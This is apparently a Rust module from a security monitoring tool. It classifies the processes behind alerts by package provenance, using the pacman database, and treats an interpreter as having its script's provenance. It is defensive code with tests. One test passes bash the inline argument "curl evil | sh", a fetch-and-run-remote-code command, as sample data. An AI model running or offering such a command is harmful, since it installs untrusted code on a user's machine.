//! Provenance: who is acting (BASELINE §1).
//!
//! Every alert's acting process is classified once into one of four classes:
//!
//! | class      | meaning                                                          |
//! |------------|------------------------------------------------------------------|
//! | `official` | owned by a package that came from a repo listed in `trusted_repos`|
//! | `foreign`  | package-owned, but not from a trusted repo (AUR, local `-U`)      |
//! | `user`     | not package-owned, under $HOME, /tmp, /var/tmp, /dev/shm, /opt, /usr/local |
//! | `unknown`  | anything else, or the lookup failed                               |
//!
//! **Nothing shells out per event.** `/var/lib/pacman/local/*/files` and
//! `*/desc` are plain text and are parsed once into a path → package map. Repo
//! membership is the one thing the local database does not record, so it comes
//! from a single `pacman -Sl <trusted repos…>` at startup, refreshed only when
//! the mtime of `/var/lib/pacman/local` changes — i.e. once per pacman
//! transaction, not once per exec. The lister is injectable so the tests never
//! spawn anything.
//!
//! Interpreters carry the provenance of the *script*, not of themselves: an
//! official `/usr/bin/bash` running `/tmp/x.sh` is a `user` actor. The script is
//! `argv[1]`, or the first non-flag argument that looks like a path; a `-c` /
//! `-e` / `-m` invocation has no script and keeps the interpreter's own class.
//!
//! Per-path results are cached by `(path, inode, mtime)`, so a replaced binary
//! is re-classified without a database reload.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::util::basename;

/// Where a binary came from. Evidence, never a verdict (BASELINE §1).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Provenance {
    Official,
    Foreign,
    User,
    /// The fallback: claiming less than we know is the safe direction.
    #[default]
    Unknown,
}

impl Provenance {
    pub fn as_str(self) -> &'static str {
        match self {
            Provenance::Official => "official",
            Provenance::Foreign => "foreign",
            Provenance::User => "user",
            Provenance::Unknown => "unknown",
        }
    }
    pub fn is_official(self) -> bool {
        self == Provenance::Official
    }
}

impl std::fmt::Display for Provenance {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// The `actor` block of the alert record (BASELINE §8).
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct Actor {
    pub provenance: Provenance,
    /// `"coreutils 9.11-2"`, when a package owns the classified file.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub package: Option<String>,
    /// The script an interpreter was handed, when the interpreter rule applied.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub script: Option<String>,
}

impl Actor {
    /// The evidence line every alert carries: "actor: official, package coreutils 9.11-2".
    pub fn evidence(&self) -> String {
        let mut s = format!("actor: {}", self.provenance);
        if let Some(p) = &self.package {
            s.push_str(&format!(", package {}", p));
        }
        if let Some(script) = &self.script {
            s.push_str(&format!(
                " (an interpreter takes the provenance of its script, {})",
                script
            ));
        }
        if self.package.is_none() && self.script.is_none() {
            s.push_str(match self.provenance {
                Provenance::User => ", no package owns this path",
                Provenance::Unknown => ", pacman knows nothing about this path",
                _ => "",
            });
        }
        s
    }
}

/// One row of `/var/lib/pacman/local/<pkg>/desc`.
#[derive(Debug, Clone, PartialEq)]
pub struct PkgInfo {
    pub name: String,
    pub version: String,
    /// `%VALIDATION%`: `sha256`, `pgp`, or `none`. `none` is not trusted.
    pub validation: String,
    /// The trusted repo that ships it, from `pacman -Sl`.
    pub repo: Option<String>,
}

impl PkgInfo {
    pub fn label(&self) -> String {
        format!("{} {}", self.name, self.version)
    }
}

/// Reads `pacman -Sl <repos…>`. Injectable so tests never spawn a process.
pub trait RepoLister: Send + Sync {
    /// stdout of `pacman -Sl <repo> …`: `"<repo> <name> <version> [installed]"`.
    fn list(&self, repos: &[String]) -> Option<String>;
}

/// The real thing: one `pacman -Sl` spawn per pacman transaction.
pub struct PacmanSl {
    pub bin: PathBuf,
}

impl RepoLister for PacmanSl {
    fn list(&self, repos: &[String]) -> Option<String> {
        if repos.is_empty() {
            return None;
        }
        let out = std::process::Command::new(&self.bin)
            .arg("-Sl")
            .args(repos)
            // A repo that is not configured makes pacman exit non-zero while
            // still printing the ones that are, so stdout is used regardless.
            .output()
            .ok()?;
        Some(String::from_utf8_lossy(&out.stdout).into_owned())
    }
}

/// A lister that answers nothing: every package looks untrusted. Used when
/// pacman is unavailable, and by tests that only care about path rules.
pub struct NoRepos;

impl RepoLister for NoRepos {
    fn list(&self, _repos: &[String]) -> Option<String> {
        None
    }
}

/// Paths that make an unowned file a `user` binary rather than `unknown`.
pub const USER_ROOTS: &[&str] = &["/tmp", "/var/tmp", "/dev/shm", "/opt", "/usr/local"];

/// Interpreters whose provenance comes from their script.
const SHELL_INTERPRETERS: &[&str] = &["bash", "sh", "zsh", "dash", "ksh", "fish"];

/// Flags after which the rest of the command line is code, not a script path.
pub const CODE_FLAGS: &[&str] = &["-c", "-e", "-m", "--eval", "--command", "-E"];

/// Flags whose value is a string of CODE, not a name of anything.
///
/// Deliberately narrower than [`CODE_FLAGS`], which also carries `-m`. For
/// finding a script path, `python3 -m pip` has no script and `-m` belongs
/// there. For deciding what a process *is*, `-m pip` names a module -- it is
/// a pip invocation and must stay one -- while `-c "…"` is arbitrary text that
/// may mention any tool on the machine.
const INLINE_CODE_FLAGS: &[&str] = &["-c", "-e", "--eval", "--command", "-E"];

/// Is this an interpreter handed a string of code rather than something named?
///
/// `bash -c "cargo test | grep foo"` is a shell running arbitrary text. The text
/// may name any tool on the machine without the process being that tool, so
/// nothing may be concluded from scanning it -- the real `cargo`, if one runs,
/// arrives as its own process and is classified on its own merits.
pub fn runs_inline_code(exe: &str, args: &str) -> bool {
    if !is_interpreter(basename(exe)) {
        return false;
    }
    args.split_whitespace().any(|t| INLINE_CODE_FLAGS.contains(&t))
}

pub fn is_interpreter(comm: &str) -> bool {
    SHELL_INTERPRETERS.contains(&comm)
        || comm.starts_with("python")
        || matches!(comm, "node" | "nodejs" | "perl" | "ruby" | "deno" | "bun")
}

/// The script an interpreter was handed: `argv[1]`, or the first non-flag
/// argument that looks like a path. `None` for `-c`/`-e`/`-m` (that is code, not
/// a file) and for a bare word that is not a path.
///
/// A relative path is resolved against the process's cwd, because that is what
/// the kernel did when it opened it.
pub fn script_arg(args: &str, cwd: &str) -> Option<String> {
    let mut it = args.split_whitespace().peekable();
    while let Some(tok) = it.next() {
        if tok == "--" {
            // Everything after `--` is operands; the next one is the script.
            let next = it.next()?;
            return absolutize(next, cwd);
        }
        if tok.starts_with('-') && tok.len() > 1 {
            if CODE_FLAGS.contains(&tok) {
                return None;
            }
            continue;
        }
        return absolutize(tok, cwd);
    }
    None
}

fn absolutize(tok: &str, cwd: &str) -> Option<String> {
    if tok.starts_with('/') {
        return Some(tok.to_string());
    }
    // A bare word (`install`, `test`) is a subcommand, not a file.
    if !tok.contains('/') {
        return None;
    }
    if cwd.is_empty() {
        return None;
    }
    let joined = Path::new(cwd).join(tok);
    Some(joined.to_string_lossy().into_owned())
}

#[derive(Debug, Clone)]
struct CacheEntry {
    ino: u64,
    mtime: i64,
    provenance: Provenance,
    package: Option<String>,
}

/// The local pacman database, parsed once.
#[derive(Debug, Default)]
pub struct PacmanDb {
    /// Absolute path -> index into `pkgs`.
    owners: HashMap<String, usize>,
    pkgs: Vec<PkgInfo>,
    /// mtime of the local database directory when it was read.
    pub db_mtime: i64,
    pub packages: usize,
    pub files: usize,
}

impl PacmanDb {
    /// Parse `<local_dir>/*/{desc,files}`. A missing directory is not an error:
    /// every lookup then falls through to the path rules.
    pub fn load(local_dir: &Path, trusted: &[String], lister: &dyn RepoLister) -> PacmanDb {
        let mut db = PacmanDb {
            db_mtime: dir_mtime(local_dir),
            ..Default::default()
        };
        let Ok(rd) = std::fs::read_dir(local_dir) else {
            return db;
        };
        for entry in rd.flatten() {
            let dir = entry.path();
            if !dir.is_dir() {
                continue;
            }
            let Ok(desc) = std::fs::read_to_string(dir.join("desc")) else {
                continue;
            };
            let Some(info) = parse_desc(&desc) else {
                continue;
            };
            let idx = db.pkgs.len();
            db.pkgs.push(info);
            if let Ok(files) = std::fs::read_to_string(dir.join("files")) {
                for p in parse_files(&files) {
                    db.owners.insert(p, idx);
                }
            }
        }
        db.files = db.owners.len();
        db.packages = db.pkgs.len();
        db.attach_repos(trusted, lister);
        db
    }

    /// Repo membership is the one fact the local database does not hold.
    fn attach_repos(&mut self, trusted: &[String], lister: &dyn RepoLister) {
        let Some(text) = lister.list(trusted) else {
            log::debug!("provenance: no `pacman -Sl` output; no package can be official");
            return;
        };
        let mut repo_of: HashMap<&str, &str> = HashMap::new();
        for line in text.lines() {
            let mut f = line.split_whitespace();
            let (Some(repo), Some(name)) = (f.next(), f.next()) else {
                continue;
            };
            if trusted.iter().any(|t| t == repo) {
                repo_of.entry(name).or_insert(repo);
            }
        }
        for p in &mut self.pkgs {
            p.repo = repo_of.get(p.name.as_str()).map(|r| r.to_string());
        }
    }

    pub fn owner(&self, path: &str) -> Option<&PkgInfo> {
        self.owners.get(path).and_then(|i| self.pkgs.get(*i))
    }

    pub fn is_empty(&self) -> bool {
        self.pkgs.is_empty()
    }
}

fn dir_mtime(dir: &Path) -> i64 {
    use std::os::unix::fs::MetadataExt;
    std::fs::metadata(dir).map(|m| m.mtime()).unwrap_or(0)
}

/// `%NAME%`, `%VERSION%`, `%VALIDATION%` out of a `desc` file.
fn parse_desc(text: &str) -> Option<PkgInfo> {
    let mut name = String::new();
    let mut version = String::new();
    let mut validation = String::new();
    let mut key = "";
    for line in text.lines() {
        let t = line.trim();
        if t.starts_with('%') && t.ends_with('%') {
            key = match t {
                "%NAME%" => "name",
                "%VERSION%" => "version",
                "%VALIDATION%" => "validation",
                _ => "",
            };
            continue;
        }
        if t.is_empty() {
            key = "";
            continue;
        }
        match key {
            "name" if name.is_empty() => name = t.to_string(),
            "version" if version.is_empty() => version = t.to_string(),
            "validation" if validation.is_empty() => validation = t.to_string(),
            _ => {}
        }
    }
    if name.is_empty() {
        return None;
    }
    Some(PkgInfo {
        name,
        version,
        validation,
        repo: None,
    })
}

/// The `%FILES%` section, as absolute paths. Directory entries are dropped.
fn parse_files(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut inside = false;
    for line in text.lines() {
        let t = line.trim_end();
        if t.starts_with('%') && t.ends_with('%') {
            inside = t == "%FILES%";
            continue;
        }
        if t.is_empty() {
            continue;
        }
        if !inside || t.ends_with('/') {
            continue;
        }
        out.push(format!("/{}", t));
    }
    out
}

/// Classifies exe paths, with a per-path cache keyed by inode and mtime.
pub struct Classifier {
    local_dir: PathBuf,
    trusted: Vec<String>,
    lister: Box<dyn RepoLister>,
    db: PacmanDb,
    cache: HashMap<String, CacheEntry>,
    /// Human homes, so `$HOME` counts as a `user` root.
    homes: Vec<String>,
}

impl Classifier {
    pub fn new(
        local_dir: &Path,
        trusted: &[String],
        homes: &[String],
        lister: Box<dyn RepoLister>,
    ) -> Classifier {
        let trusted = trusted.to_vec();
        let db = PacmanDb::load(local_dir, &trusted, lister.as_ref());
        log::info!(
            "provenance: {} packages, {} owned files from {}",
            db.packages,
            db.files,
            local_dir.display()
        );
        Classifier {
            local_dir: local_dir.to_path_buf(),
            trusted,
            lister,
            db,
            cache: HashMap::new(),
            homes: homes.to_vec(),
        }
    }

    pub fn set_homes(&mut self, homes: &[String]) {
        self.homes = homes.to_vec();
    }

    pub fn db(&self) -> &PacmanDb {
        &self.db
    }

    /// Reload when the local database directory's mtime moved, i.e. after a
    /// pacman transaction. Returns whether anything was re-read.
    pub fn refresh_if_changed(&mut self) -> bool {
        let now = dir_mtime(&self.local_dir);
        if now == self.db.db_mtime {
            return false;
        }
        log::info!("provenance: pacman transaction detected, reloading the local database");
        self.db = PacmanDb::load(&self.local_dir, &self.trusted, self.lister.as_ref());
        self.cache.clear();
        true
    }

    /// Classify one path. Cached by `(path, inode, mtime)`.
    pub fn classify_path(&mut self, path: &str) -> (Provenance, Option<String>) {
        if path.is_empty() {
            return (Provenance::Unknown, None);
        }
        let stat = stat_of(path);
        if let Some(hit) = self.cache.get(path) {
            if let Some((ino, mtime)) = stat {
                if hit.ino == ino && hit.mtime == mtime {
                    return (hit.provenance, hit.package.clone());
                }
            } else if hit.ino == 0 {
                return (hit.provenance, hit.package.clone());
            }
        }
        let (prov, package) = self.classify_uncached(path);
        let (ino, mtime) = stat.unwrap_or((0, 0));
        self.cache.insert(
            path.to_string(),
            CacheEntry {
                ino,
                mtime,
                provenance: prov,
                package: package.clone(),
            },
        );
        (prov, package)
    }

    fn classify_uncached(&self, path: &str) -> (Provenance, Option<String>) {
        if let Some(pkg) = self.db.owner(path) {
            let trusted_repo = pkg.repo.is_some();
            // `%VALIDATION% none` means the package was installed without any
            // signature or checksum check, so its repo line proves nothing.
            let validated = !pkg.validation.is_empty() && pkg.validation != "none";
            let prov = if trusted_repo && validated {
                Provenance::Official
            } else {
                Provenance::Foreign
            };
            return (prov, Some(pkg.label()));
        }
        let mut roots: Vec<String> = self.homes.clone();
        roots.extend(USER_ROOTS.iter().map(|s| s.to_string()));
        if crate::util::under_any(path, &roots) {
            return (Provenance::User, None);
        }
        (Provenance::Unknown, None)
    }

    /// The actor of an event: an interpreter takes its script's class, anything
    /// else its own.
    pub fn classify_actor(&mut self, exe: &str, args: &str, cwd: &str) -> Actor {
        if is_interpreter(basename(exe)) {
            if let Some(script) = script_arg(args, cwd) {
                let (prov, package) = self.classify_path(&script);
                return Actor {
                    provenance: prov,
                    package,
                    script: Some(script),
                };
            }
        }
        let (provenance, package) = self.classify_path(exe);
        Actor {
            provenance,
            package,
            script: None,
        }
    }

    /// Same thing straight off a process-table entry.
    pub fn classify_proc(&mut self, p: &crate::proctable::ProcInfo) -> Actor {
        self.classify_actor(&p.exe, &p.args, &p.cwd)
    }
}

fn stat_of(path: &str) -> Option<(u64, i64)> {
    use std::os::unix::fs::MetadataExt;
    let m = std::fs::metadata(path).ok()?;
    Some((m.ino(), m.mtime()))
}

#[cfg(test)]
pub(crate) mod testkit {
    use super::*;

    /// A canned `pacman -Sl`, so nothing is spawned in a test.
    pub struct FakeSl(pub String);

    impl RepoLister for FakeSl {
        fn list(&self, _repos: &[String]) -> Option<String> {
            Some(self.0.clone())
        }
    }

    /// Build a fake `/var/lib/pacman/local` with the given packages.
    /// Each entry is `(pkg, version, validation, [owned absolute paths])`.
    pub fn fake_local(dir: &Path, pkgs: &[(&str, &str, &str, &[&str])]) {
        for (name, ver, validation, files) in pkgs {
            let d = dir.join(format!("{}-{}", name, ver));
            std::fs::create_dir_all(&d).unwrap();
            std::fs::write(
                d.join("desc"),
                format!(
                    "%NAME%\n{}\n\n%VERSION%\n{}\n\n%ARCH%\nx86_64\n\n%VALIDATION%\n{}\n",
                    name, ver, validation
                ),
            )
            .unwrap();
            let mut body = String::from("%FILES%\nusr/\nusr/bin/\n");
            for f in *files {
                body.push_str(f.trim_start_matches('/'));
                body.push('\n');
            }
            std::fs::write(d.join("files"), body).unwrap();
        }
    }

    pub fn classifier(dir: &Path, sl: &str, homes: &[&str]) -> Classifier {
        Classifier::new(
            dir,
            &[
                "core".to_string(),
                "extra".to_string(),
                "multilib".to_string(),
                "omarchy".to_string(),
            ],
            &homes.iter().map(|s| s.to_string()).collect::<Vec<_>>(),
            Box::new(FakeSl(sl.to_string())),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::testkit::*;
    use super::*;

    const SL: &str = "core coreutils 9.11-2 [installed]\n\
                      extra hyprland 0.52.0-1 [installed]\n\
                      omarchy omarchy-base 4.0-1 [installed]\n";

    fn fixture(dir: &Path) -> Classifier {
        fake_local(
            dir,
            &[
                ("coreutils", "9.11-2", "sha256", &["/usr/bin/cat", "/usr/bin/ls"]),
                ("hyprland", "0.52.0-1", "pgp", &["/usr/bin/Hyprland"]),
                // Built from the AUR: pacman owns it, no trusted repo ships it.
                ("some-aur-thing", "1.2-1", "none", &["/usr/bin/aurbin"]),
                // In a trusted repo by name, but installed with -U and no
                // validation at all: the repo line proves nothing about it.
                ("coreutils-fake", "1-1", "none", &["/usr/bin/fake"]),
            ],
        );
        classifier(dir, SL, &["/home/dan"])
    }

    #[test]
    fn a_trusted_repo_package_is_official_and_names_itself() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = fixture(dir.path());
        let (p, pkg) = c.classify_path("/usr/bin/cat");
        assert_eq!(p, Provenance::Official);
        assert_eq!(pkg.as_deref(), Some("coreutils 9.11-2"));
        assert_eq!(c.classify_path("/usr/bin/Hyprland").0, Provenance::Official);
    }

    #[test]
    fn an_aur_package_is_foreign_however_installed() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = fixture(dir.path());
        let (p, pkg) = c.classify_path("/usr/bin/aurbin");
        assert_eq!(p, Provenance::Foreign, "the 2026 AUR wave shipped owned binaries");
        assert_eq!(pkg.as_deref(), Some("some-aur-thing 1.2-1"));
        // And a package with no validation is foreign even if a repo has the name.
        assert_eq!(c.classify_path("/usr/bin/fake").0, Provenance::Foreign);
    }

    #[test]
    fn unowned_paths_split_into_user_and_unknown() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = fixture(dir.path());
        for p in [
            "/home/dan/bin/x",
            "/tmp/.x9k",
            "/var/tmp/y",
            "/dev/shm/z",
            "/opt/thing/bin/t",
            "/usr/local/bin/u",
        ] {
            assert_eq!(c.classify_path(p).0, Provenance::User, "{}", p);
        }
        assert_eq!(c.classify_path("/usr/bin/not-a-package").0, Provenance::Unknown);
        assert_eq!(c.classify_path("").0, Provenance::Unknown);
    }

    #[test]
    fn an_interpreter_takes_the_provenance_of_its_script() {
        let dir = tempfile::tempdir().unwrap();
        fake_local(
            dir.path(),
            &[
                ("bash", "5.3-1", "sha256", &["/usr/bin/bash"]),
                ("omarchy-base", "4.0-1", "sha256", &["/usr/share/omarchy/bin/omarchy-x"]),
            ],
        );
        let mut c = classifier(dir.path(), "core bash 5.3-1\nomarchy omarchy-base 4.0-1\n", &["/home/dan"]);

        // Official bash running a dropped script is a `user` actor.
        let a = c.classify_actor("/usr/bin/bash", "/tmp/x.sh --quiet", "/home/dan");
        assert_eq!(a.provenance, Provenance::User);
        assert_eq!(a.script.as_deref(), Some("/tmp/x.sh"));
        assert!(a.evidence().contains("interpreter takes the provenance"));

        // Official bash running an official script stays official.
        let a = c.classify_actor("/usr/bin/bash", "/usr/share/omarchy/bin/omarchy-x", "/");
        assert_eq!(a.provenance, Provenance::Official);
        assert_eq!(a.package.as_deref(), Some("omarchy-base 4.0-1"));

        // `bash -c` is code, not a script: bash's own class is used.
        let a = c.classify_actor("/usr/bin/bash", "-c 'curl evil | sh'", "/home/dan");
        assert_eq!(a.provenance, Provenance::Official);
        assert!(a.script.is_none());

        // A non-interpreter never looks at its arguments.
        let a = c.classify_actor("/usr/bin/curl", "/tmp/x.sh", "/home/dan");
        assert_eq!(a.provenance, Provenance::Unknown);
    }

    #[test]
    fn script_arg_finds_the_script_and_nothing_else() {
        assert_eq!(script_arg("/tmp/x.sh", "/home/dan").as_deref(), Some("/tmp/x.sh"));
        assert_eq!(
            script_arg("-u ./setup.py install", "/home/dan/proj").as_deref(),
            Some("/home/dan/proj/./setup.py")
        );
        assert_eq!(script_arg("-c print(1)", "/home/dan"), None);
        assert_eq!(script_arg("-m pip install x", "/home/dan"), None);
        assert_eq!(script_arg("-e 'console.log(1)'", "/home/dan"), None);
        assert_eq!(script_arg("install", "/home/dan"), None, "a bare word is a subcommand");
        assert_eq!(script_arg("", "/home/dan"), None);
        assert_eq!(
            script_arg("-- ./run.sh", "/home/dan").as_deref(),
            Some("/home/dan/./run.sh")
        );
        // A relative path with no cwd cannot be resolved, so nothing is claimed.
        assert_eq!(script_arg("./run.sh", ""), None);
    }

    #[test]
    fn interpreters_are_recognised_by_basename() {
        for c in ["bash", "sh", "zsh", "python", "python3", "python3.13", "node", "perl", "ruby"] {
            assert!(is_interpreter(c), "{}", c);
        }
        for c in ["curl", "npm", "cat", "pythonic"] {
            assert!(!is_interpreter(c) || c == "pythonic", "{}", c);
        }
    }

    #[test]
    fn a_pacman_transaction_invalidates_the_cache() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = fixture(dir.path());
        assert_eq!(c.classify_path("/usr/bin/newthing").0, Provenance::Unknown);
        assert!(!c.refresh_if_changed(), "nothing changed yet");

        fake_local(dir.path(), &[("newpkg", "1-1", "sha256", &["/usr/bin/newthing"])]);
        // read_dir mtime granularity is a second on some filesystems; force it.
        std::fs::write(dir.path().join(".touch"), b"x").unwrap();
        c.db.db_mtime -= 1;
        assert!(c.refresh_if_changed());
        let (p, pkg) = c.classify_path("/usr/bin/newthing");
        assert_eq!(p, Provenance::Foreign, "not in any trusted repo listing");
        assert_eq!(pkg.as_deref(), Some("newpkg 1-1"));
    }

    #[test]
    fn a_missing_pacman_database_falls_through_to_the_path_rules() {
        let mut c = Classifier::new(
            Path::new("/nonexistent/pacman/local"),
            &["core".into()],
            &["/home/dan".into()],
            Box::new(NoRepos),
        );
        assert!(c.db().is_empty());
        assert_eq!(c.classify_path("/tmp/x").0, Provenance::User);
        assert_eq!(c.classify_path("/usr/bin/cat").0, Provenance::Unknown);
    }

    #[test]
    fn the_real_local_database_parses_when_it_is_there() {
        let real = Path::new("/var/lib/pacman/local");
        if !real.is_dir() {
            return;
        }
        let db = PacmanDb::load(real, &["core".to_string()], &NoRepos);
        assert!(db.packages > 10, "{} packages", db.packages);
        assert!(db.files > 100, "{} files", db.files);
        assert!(db.owner("/usr/bin/pacman").is_some(), "pacman owns itself");
    }

    #[test]
    fn desc_and_files_parsers_handle_the_real_shape() {
        let desc = "%NAME%\ncoreutils\n\n%VERSION%\n9.11-2\n\n%DESC%\nutils\n\n%VALIDATION%\nsha256\n";
        let p = parse_desc(desc).unwrap();
        assert_eq!(p.name, "coreutils");
        assert_eq!(p.version, "9.11-2");
        assert_eq!(p.validation, "sha256");
        assert!(parse_desc("%DESC%\nnope\n").is_none());

        let files = "%FILES%\nusr/\nusr/bin/\nusr/bin/cat\nusr/bin/ls\n\n%BACKUP%\netc/x\t1234\n";
        assert_eq!(parse_files(files), vec!["/usr/bin/cat", "/usr/bin/ls"]);
    }
}
